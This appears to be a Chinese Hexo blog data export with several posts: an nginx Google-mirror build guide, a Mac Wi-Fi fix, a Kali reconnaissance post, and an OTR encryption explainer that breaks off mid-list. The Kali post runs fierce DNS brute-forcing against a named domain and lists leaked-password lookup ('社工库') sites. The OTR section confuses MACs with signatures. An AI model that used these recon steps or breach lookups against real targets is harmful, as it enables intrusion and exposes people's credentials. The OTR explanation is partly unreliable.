id=\"教程\"><a href=\"#教程\" class=\"headerlink\" title=\"教程\"></a>教程</h1><h2 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h2><p>Centos 6 </p>\n<h2 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h2><ol>\n<li>nginx</li>\n<li>pcre 正则</li>\n<li>ngx_http_proxy_module 反向代理</li>\n<li>ngx_http_substitutions_filter_module 多重替换</li>\n</ol>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 安装 gcc &amp; git</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">apt-get install build-essential git gcc g++ make</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载最新版源码</span></div><div class=\"line\"><span class=\"comment\"># nginx 官网: </span></div><div class=\"line\"><span class=\"comment\"># http://nginx.org/en/download.html</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">wget <span class=\"string\">\"http://nginx.org/download/nginx-1.7.8.tar.gz\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载最新版 pcre</span></div><div class=\"line\"><span class=\"comment\"># pcre 官网:</span></div><div class=\"line\"><span class=\"comment\"># http://www.pcre.org/</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">wget <span class=\"string\">\"ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载最新版 openssl</span></div><div class=\"line\"><span class=\"comment\"># opessl 官网:</span></div><div class=\"line\"><span class=\"comment\"># https://www.openssl.org/</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">wget <span class=\"string\">\"https://www.openssl.org/source/openssl-1.0.1j.tar.gz\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载最新版 zlib</span></div><div class=\"line\"><span class=\"comment\"># zlib 官网:</span></div><div class=\"line\"><span class=\"comment\"># http://www.zlib.net/</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">wget <span class=\"string\">\"http://zlib.net/zlib-1.2.8.tar.gz\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载本扩展</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/cuber/ngx_http_google_filter_module</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 下载 substitutions 扩展</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/yaoweibin/ngx_http_substitutions_filter_module</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 解压缩</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">tar xzvf nginx-1.7.8.tar.gz</div><div class=\"line\">tar xzvf pcre-8.38.tar.gz</div><div class=\"line\">tar xzvf openssl-1.0.1j.tar.gz</div><div class=\"line\">tar xzvf zlib-1.2.8.tar.gz</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 进入 nginx 源码目录</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"built_in\">cd</span> nginx-1.7.8</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 设置编译选项</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">./configure \\</div><div class=\"line\">  --prefix=/opt/nginx-1.7.8 \\</div><div class=\"line\">  --with-pcre=../pcre-8.38 \\</div><div class=\"line\">  --with-openssl=../openssl-1.0.1j \\</div><div class=\"line\">  --with-zlib=../zlib-1.2.8 \\</div><div class=\"line\">  --with-http_ssl_module \\</div><div class=\"line\">  --add-module=../ngx_http_google_filter_module \\</div><div class=\"line\">  --add-module=../ngx_http_substitutions_filter_module</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 编译, 安装</span></div><div class=\"line\"><span class=\"comment\"># 如果扩展有报错, 请发 issue 到</span></div><div class=\"line\"><span class=\"comment\"># https://github.com/cuber/ngx_http_google_filter_module/issues</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">make</div><div class=\"line\">sudo make install</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 启动, 安装过程到此结束</span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">sudo /opt/nginx-1.7.8/sbin/nginx</div><div class=\"line\"></div><div class=\"line\">vi /opt/nginx-1.7.8/conf/nginx.conf</div></pre></td></tr></table></figure>\n<p>http配置方式<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">server &#123;</div><div class=\"line\">  server_name &lt;你的域名&gt;;</div><div class=\"line\">  listen <span class=\"number\">80</span>;</div><div class=\"line\"></div><div class=\"line\">  resolver <span class=\"number\">8.8</span><span class=\"number\">.8</span><span class=\"number\">.8</span>;</div><div class=\"line\">  location / &#123;</div><div class=\"line\">    google on;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>https配置方式<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">server &#123;</div><div class=\"line\">  server_name &lt;你的域名&gt;;</div><div class=\"line\">  listen <span class=\"number\">443</span>;</div><div class=\"line\"></div><div class=\"line\">  ssl on;</div><div class=\"line\">  ssl_certificate &lt;你的证书&gt;;</div><div class=\"line\">  ssl_certificate_key &lt;你的私钥&gt;;</div><div class=\"line\"></div><div class=\"line\">  resolver <span class=\"number\">8.8</span><span class=\"number\">.8</span><span class=\"number\">.8</span>;</div><div class=\"line\">  location / &#123;</div><div class=\"line\">    google on;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>随后<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\"><span class=\"comment\"># 配置修改后, 需要 reload nginx 来让配置生效, </span></div><div class=\"line\"><span class=\"comment\">#</span></div><div class=\"line\">sudo /opt/nginx-1.7.8/sbin/nginx <span class=\"_\">-s</span> reload</div></pre></td></tr></table></figure></p>\n<h1 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h1><p>测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。</p>\n<h1 id=\"参考技术\"><a href=\"#参考技术\" class=\"headerlink\" title=\"参考技术\"></a>参考技术</h1><p><a href=\"https://github.com/cuber/ngx_http_google_filter_module\">https://github.com/cuber/ngx_http_google_filter_module</a></p>"},{"title":"Mac Wi-Fi掉线解决方案","date":"2016-10-09T14:07:52.000Z","_content":"\n最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。\n\n分享解决方案：\n\n进入目录`/Library/Preferences/SystemConfiguration\n`\n\n删除\n\n```\ncom.apple.airport.preferences.plist\ncom.apple.network.identification.plist\ncom.apple.wifi.message-tracer.plist\nNetworkInterfaces.plist\npreferences.plist\n```\n\n重启\n\n解决问题。\n\n转载自：http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html","source":"_posts/Mac-Wi-Fi-掉线解决方案-1.md","raw":"---\ntitle: Mac Wi-Fi掉线解决方案\ndate: 2016-10-09 15:07:52\ntags: Mac\ncategories: Mac\n---\n\n最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。\n\n分享解决方案：\n\n进入目录`/Library/Preferences/SystemConfiguration\n`\n\n删除\n\n```\ncom.apple.airport.preferences.plist\ncom.apple.network.identification.plist\ncom.apple.wifi.message-tracer.plist\nNetworkInterfaces.plist\npreferences.plist\n```\n\n重启\n\n解决问题。\n\n转载自：http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html","slug":"Mac-Wi-Fi-掉线解决方案-1","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xo3000t5es5w3mlp13f","content":"<p>最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。</p>\n<p>分享解决方案：</p>\n<p>进入目录<code>/Library/Preferences/SystemConfiguration</code></p>\n<p>删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">com.apple.airport.preferences.plist</div><div class=\"line\">com.apple.network.identification.plist</div><div class=\"line\">com.apple.wifi.message-tracer.plist</div><div class=\"line\">NetworkInterfaces.plist</div><div class=\"line\">preferences.plist</div></pre></td></tr></table></figure>\n<p>重启</p>\n<p>解决问题。</p>\n<p>转载自：<a href=\"http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html\" target=\"_blank\" rel=\"external\">http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html</a></p>\n","excerpt":"","more":"<p>最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。</p>\n<p>分享解决方案：</p>\n<p>进入目录<code>/Library/Preferences/SystemConfiguration</code></p>\n<p>删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">com.apple.airport.preferences.plist</div><div class=\"line\">com.apple.network.identification.plist</div><div class=\"line\">com.apple.wifi.message-tracer.plist</div><div class=\"line\">NetworkInterfaces.plist</div><div class=\"line\">preferences.plist</div></pre></td></tr></table></figure>\n<p>重启</p>\n<p>解决问题。</p>\n<p>转载自：<a href=\"http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html\">http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html</a></p>\n"},{"title":"Kali系列——信息收集阶段（二）","id":"8","updated":"2016-08-05T20:13:14.000Z","date":"2016-08-01T22:20:17.000Z","_content":"<!-- more --> \n## fierece\n暴力破解dns解析\n```bash\nroot@kali:~# fierce -dns dbstye.net\n\nTrying zone transfer first...\n\nUnsuccessful in zone transfer (it was worth a shot)\nOkay, trying the good old fashioned way... brute force\n\nChecking for wildcard DNS...\nNope. Good.\nNow performing 2280 test(s)...\n```\n应用字典\n\n```bash\nroot@kali:~# fierce -dns dbstye.net -wordlist myWordlist.txt\n```\n\n## 社工库\n部分需翻墙\n\n* http://www.xiumima.com/\n\n* http://cha.hxsec.com/\n\n* http://findmima.com\n\n* http://163.donothackme.club/\n\n* http://www.rallyindonesia.com/","source":"_posts/Kali系列——信息收集阶段（二）.md","raw":"---\ntitle: Kali系列——信息收集阶段（二）\ntags: 'Hack'\npermalink: kalixi-lie-xin-xi-shou-ji-jie-duan-yi\nid: 8\nupdated: '2016-08-05 21:13:14'\ndate: 2016-08-01 23:20:17\n---\n<!-- more --> \n## fierece\n暴力破解dns解析\n```bash\nroot@kali:~# fierce -dns dbstye.net\n\nTrying zone transfer first...\n\nUnsuccessful in zone transfer (it was worth a shot)\nOkay, trying the good old fashioned way... brute force\n\nChecking for wildcard DNS...\nNope. Good.\nNow performing 2280 test(s)...\n```\n应用字典\n\n```bash\nroot@kali:~# fierce -dns dbstye.net -wordlist myWordlist.txt\n```\n\n## 社工库\n部分需翻墙\n\n* http://www.xiumima.com/\n\n* http://cha.hxsec.com/\n\n* http://findmima.com\n\n* http://163.donothackme.club/\n\n* http://www.rallyindonesia.com/","slug":"kalixi-lie-xin-xi-shou-ji-jie-duan-yi","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xo4000x5es5dlqzxc4n","content":"<a id=\"more\"></a> \n<h2 id=\"fierece\"><a href=\"#fierece\" class=\"headerlink\" title=\"fierece\"></a>fierece</h2><p>暴力破解dns解析<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net</span></div><div class=\"line\"></div><div class=\"line\">Trying zone transfer first...</div><div class=\"line\"></div><div class=\"line\">Unsuccessful <span class=\"keyword\">in</span> zone transfer (it was worth a shot)</div><div class=\"line\">Okay, trying the good old fashioned way... brute force</div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> wildcard DNS...</div><div class=\"line\">Nope. Good.</div><div class=\"line\">Now performing 2280 <span class=\"built_in\">test</span>(s)...</div></pre></td></tr></table></figure></p>\n<p>应用字典</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net -wordlist myWordlist.txt</span></div></pre></td></tr></table></figure>\n<h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><p>部分需翻墙</p>\n<ul>\n<li><p><a href=\"http://www.xiumima.com/\" target=\"_blank\" rel=\"external\">http://www.xiumima.com/</a></p>\n</li>\n<li><p><a href=\"http://cha.hxsec.com/\" target=\"_blank\" rel=\"external\">http://cha.hxsec.com/</a></p>\n</li>\n<li><p><a href=\"http://findmima.com\" target=\"_blank\" rel=\"external\">http://findmima.com</a></p>\n</li>\n<li><p><a href=\"http://163.donothackme.club/\" target=\"_blank\" rel=\"external\">http://163.donothackme.club/</a></p>\n</li>\n<li><p><a href=\"http://www.rallyindonesia.com/\" target=\"_blank\" rel=\"external\">http://www.rallyindonesia.com/</a></p>\n</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"fierece\"><a href=\"#fierece\" class=\"headerlink\" title=\"fierece\"></a>fierece</h2><p>暴力破解dns解析<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net</span></div><div class=\"line\"></div><div class=\"line\">Trying zone transfer first...</div><div class=\"line\"></div><div class=\"line\">Unsuccessful <span class=\"keyword\">in</span> zone transfer (it was worth a shot)</div><div class=\"line\">Okay, trying the good old fashioned way... brute force</div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> wildcard DNS...</div><div class=\"line\">Nope. Good.</div><div class=\"line\">Now performing 2280 <span class=\"built_in\">test</span>(s)...</div></pre></td></tr></table></figure></p>\n<p>应用字典</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net -wordlist myWordlist.txt</span></div></pre></td></tr></table></figure>\n<h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><p>部分需翻墙</p>\n<ul>\n<li><p><a href=\"http://www.xiumima.com/\">http://www.xiumima.com/</a></p>\n</li>\n<li><p><a href=\"http://cha.hxsec.com/\">http://cha.hxsec.com/</a></p>\n</li>\n<li><p><a href=\"http://findmima.com\">http://findmima.com</a></p>\n</li>\n<li><p><a href=\"http://163.donothackme.club/\">http://163.donothackme.club/</a></p>\n</li>\n<li><p><a href=\"http://www.rallyindonesia.com/\">http://www.rallyindonesia.com/</a></p>\n</li>\n</ul>"},{"title":"OTR(Off-the-Record) 技术探讨","date":"2016-12-06T20:25:59.000Z","_content":"\n中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。\n\n<!--more-->\n\n通过OTR技术，能够实现:\n- 加密聊天内容\n- 证明与你聊天的人就是与你聊天的人（防止中间人攻击）\n- 服务器无法记录你的真实聊天内容\n\n# 原理\n## 消息鉴别码(MAC)\n\n在密码学中，消息鉴别码(Message Authentication Code)是经过特定算法后产生的一小段信息，检查某段消息的完整性，以及作身份验证。\n\n![](/content/images/otr/1.png)\n\n假设有两个聊天用户，一个叫Alice，一个叫Bob。\n\n![](/content/images/otr/2.jpg)\n\n例如：Alice要给一个叫Bob发信，Alice将明文MK使用Hash算法进行摘要提取，提取结果为Hash(MK)，之后用Alice的私钥对摘要进行签名SA[Hash(MK)]，之后将MK和SA[Hash(MK)]一同发给Bob。\n\n其中SA[Hash(MK)]便可称之为消息鉴别码（MAC）。\n\n它可以用来检查在消息传递过程中，其内容是否被更改过，不管更改的原因是来自意外或是蓄意攻击。同时可以作为消息来源的身份验证，确认消息的来源。\n\n## 过程\n\n第一步，使用Diffie-Hellman双方交换公钥，确认公钥可以信任（只大概叙述，取mod运算被简化）。\n\n- Alice（用A表示）和Bob（用B表示）每人分别取一个数x,y,并且取一个g\n- A->B: Alice 生成g^x，并且签名SignAlice(g^x)\n- B->A: Bob 生成g^y，并且签名SignBob(g^y)\n- SS=g^xy: 生成共享的公钥\n\n第二步，使用公钥加密消息，消息传递。\n\n- 计算EK=Hash(SS), MK=Hash(EK) \n- A->B: Encek(M), MAC(Encek(M),MK)\n- Enc采用对称加密算法，比如AES算法用EK作为密钥\n- Bob 用MK验证MAC, 用EK解密M\n- 保密性和真实性得到了保证\n\n第三步，更新密钥\n\n- Alice and Bob 再取一个x',y'\n- A->B: g^x’, MAC(g^x’, MK)\n- B->A: g^y’, MAC(g^y’, MK)\n- SS’ = H(g^x’y’)\n- EK’ = H(SS’), MK’=H(EK’)\n- 随后，Alice和Bob安全清除掉之前的SS, x, y, EK\n\n第四步，继续保留 MK\n\n- Alice 和 Bob 并不需要去清除MK\n- 事实上，在他们发下一条消息的时候还用着之前的MK\n- 这让中间人攻击者只能伪造过去的消息，并不能对现在的消息造成影响\n\n从宏观的角度上来看，假设是Alice是消息发送方 发给 Bob是消息接受方，大致步骤可以分为：\n\n1. Alice 和 Bob 都自行生成一对公私钥对，并将自己的公钥发送给对方\n2. 若消息Alice打算发送消息M，则发送方首先用Bob的公钥和自己的私钥对M进行加密、签名，得到M1\n3. M1经由服务器被发送给消息接收方\n4. Bob用自己的私钥和Alice的公钥对M1进行解密、签名校验，最终还原出M\n\n\n# Awesome OTRs\n官网: https://otr.cypherpunks.ca/\n\npidgin-otr: https://otr.cypherpunks.ca/gentoo-install/otr-setup.html\n\nJavaScript 实现: https://github.com/arlolra/otr\n\notr.to源代码(JS): https://github.com/OTRMan/otr.to-chat\n\n一个python的otr项目: https://github.com/SpiralP/HexChat-otr\n\notrtalk(JS): https://github.com/mnaamani/otrtalk\n\nFacebook的OTR实现Chrome插件:https://github.com/osnr/otron\n\n一个基于OTR技术的P2P聊天系统: https://github.com/mehrvarz/P2pChatOTR\n\n# 小结\n\n研究算法的过程很有趣，也很累，每次应用OTR技术聊天的时候，我都强烈的感受到我的数据包被加密解密的过程，不知道为什么，感觉，异常，舒爽...\n","source":"_posts/OTR技术探讨.md","raw":"---\ntitle: OTR(Off-the-Record) 技术探讨\ndate: 2016-12-06 20:25:59\ntags: Hack\ncategories: Hack\n---\n\n中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。\n\n<!--more-->\n\n通过OTR技术，能够实现:\n- 加密聊天内容\n- 证明与你聊天的人就是与你聊天的人（防止中间人攻击）\n- 服务器无法记录你的真实聊天内容\n\n# 原理\n## 消息鉴别码(MAC)\n\n在密码学中，消息鉴别码(Message Authentication Code)是经过特定算法后产生的一小段信息，检查某段消息的完整性，以及作身份验证。\n\n![](/content/images/otr/1.png)\n\n假设有两个聊天用户，一个叫Alice，一个叫Bob。\n\n![](/content/images/otr/2.jpg)\n\n例如：Alice要给一个叫Bob发信，Alice将明文MK使用Hash算法进行摘要提取，提取结果为Hash(MK)，之后用Alice的私钥对摘要进行签名SA[Hash(MK)]，之后将MK和SA[Hash(MK)]一同发给Bob。\n\n其中SA[Hash(MK)]便可称之为消息鉴别码（MAC）。\n\n它可以用来检查在消息传递过程中，其内容是否被更改过，不管更改的原因是来自意外或是蓄意攻击。同时可以作为消息来源的身份验证，确认消息的来源。\n\n## 过程\n\n第一步，使用Diffie-Hellman双方交换公钥，确认公钥可以信任（只大概叙述，取mod运算被简化）。\n\n- Alice（用A表示）和Bob（用B表示）每人分别取一个数x,y,并且取一个g\n- A->B: Alice 生成g^x，并且签名SignAlice(g^x)\n- B->A: Bob 生成g^y，并且签名SignBob(g^y)\n- SS=g^xy: 生成共享的公钥\n\n第二步，使用公钥加密消息，消息传递。\n\n- 计算EK=Hash(SS), MK=Hash(EK) \n- A->B: Encek(M), MAC(Encek(M),MK)\n- Enc采用对称加密算法，比如AES算法用EK作为密钥\n- Bob 用MK验证MAC, 用EK解密M\n- 保密性和真实性得到了保证\n\n第三步，更新密钥\n\n- Alice and Bob 再取一个x',y'\n- A->B: g^x’, MAC(g^x’, MK)\n- B->A: g^y’, MAC(g^y’, MK)\n- SS’ = H(g^x’y’)\n- EK’ = H(SS’), MK’=H(EK’)\n- 随后，Alice和Bob安全清除掉之前的SS, x, y, EK\n\n第四步，继续保留 MK\n\n- Alice 和 Bob 并不需要去清除MK\n- 事实上，在他们发下一条消息的时候还用着之前的MK\n- 这让中间人攻击者只能伪造过去的消息，并不能对现在的消息造成影响\n\n从宏观的角度上来看，假设是Alice是消息发送方 发给 Bob是消息接受方，大致步骤可以分为：\n\n1. Alice 和 Bob 都自行生成一对公私钥对，并将自己的公钥发送给对方\n2. 若消息Alice打算发送消息M，则发送方首先用Bob的公钥和自己的私钥对M进行加密、签名，得到M1\n3. M1经由服务器被发送给消息接收方\n4. Bob用自己的私钥和Alice的公钥对M1进行解密、签名校验，最终还原出M\n\n\n# Awesome OTRs\n官网: https://otr.cypherpunks.ca/\n\npidgin-otr: https://otr.cypherpunks.ca/gentoo-install/otr-setup.html\n\nJavaScript 实现: https://github.com/arlolra/otr\n\notr.to源代码(JS): https://github.com/OTRMan/otr.to-chat\n\n一个python的otr项目: https://github.com/SpiralP/HexChat-otr\n\notrtalk(JS): https://github.com/mnaamani/otrtalk\n\nFacebook的OTR实现Chrome插件:https://github.com/osnr/otron\n\n一个基于OTR技术的P2P聊天系统: https://github.com/mehrvarz/P2pChatOTR\n\n# 小结\n\n研究算法的过程很有趣，也很累，每次应用OTR技术聊天的时候，我都强烈的感受到我的数据包被加密解密的过程，不知道为什么，感觉，异常，舒爽...\n","slug":"OTR技术探讨","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xo6000z5es5qw92y846","content":"<p>中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。</p>\n<a id=\"more\"></a>\n<p>通过OTR技术，能够实现:</p>\n<ul>\n<li>加密聊天内容</li>\n<li>证明与你聊天的人就是与你聊天的人（防止中间人攻击）</li>\n<li>服务器无法记录你的真实聊天内容</li>\n</ul>\n<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><h2 id=\"消息鉴别码-MAC\"><a href=\"#消息鉴别码-MAC\" class=\"headerlink\" title=\"消息鉴别码(MAC)\"></a>消息鉴别码(MAC)</h2><p>在密码学中，消息鉴别码(Message Authentication Code)是经过特定算法后产生的一小段信息，检查某段消息的完整性，以及作身份验证。</p>\n<p><img src=\"/content/images/otr/1.png\" alt=\"\"></p>\n<p>假设有两个聊天用户，一个叫Alice，一个叫Bob。</p>\n<p><img src=\"/content/images/otr/2.jpg\" alt=\"\"></p>\n<p>例如：Alice要给一个叫Bob发信，Alice将明文MK使用Hash算法进行摘要提取，提取结果为Hash(MK)，之后用Alice的私钥对摘要进行签名SA[Hash(MK)]，之后将MK和SA[Hash(MK)]一同发给Bob。</p>\n<p>其中SA[Hash(MK)]便可称之为消息鉴别码（MAC）。</p>\n<p>它可以用来检查在消息传递过程中，其内容是否被更改过，不管更改的原因是来自意外或是蓄意攻击。同时可以作为消息来源的身份验证，确认消息的来源。</p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p>第一步，使用Diffie-Hellman双方交换公钥，确认公钥可以信任（只大概叙述，取mod运算被简化）。</p>\n<ul>\n<li>Alice（用A表示）和Bob（用B表示）每人分别取一个数x,y,并且取一个g</li>\n<li>A-&gt;B: Alice 生成g^x，并且签名SignAlice(g^x)</li>\n<li>B-&gt;A: Bob 生成g^y，并且签名SignBob(g^y)</li>\n<li>SS=g^xy: 生成共享的公钥</li>\n</ul>\n<p>第二步，使用公钥加密消息，消息传递。</p>\n<ul>\n<li>计算EK=Hash(SS), MK=Hash(EK) </li>\n<li>A-&gt;B: Encek(M), MAC(Encek(M),MK)</li>\n<li>Enc采用对称加密算法，比如AES算法用EK作为密钥</li>\n<li>Bob 用MK验证MAC, 用EK解密M</li>\n<li>保密性和真实性得到了保证</li>\n</ul>\n<p>第三步，更新密钥</p>\n<ul>\n<li>Alice and Bob 再取一个x’,y’</li>\n<li>A-&gt;B: g^x’, MAC(g^x’, MK)</li>\n<li>B-&gt;A: g^y’, MAC(g^y’, MK)</li>\n<li>SS’ = H(g^x’y’)</li>\n<li>EK’ = H(SS’), MK’=H(EK’)</li>\n<li>随后，Alice和Bob安全清除掉之前的SS, x, y, EK</li>\n</ul>\n<p>第四步，继续保留 MK</p>\n<ul>\n<li>Alice 和 Bob 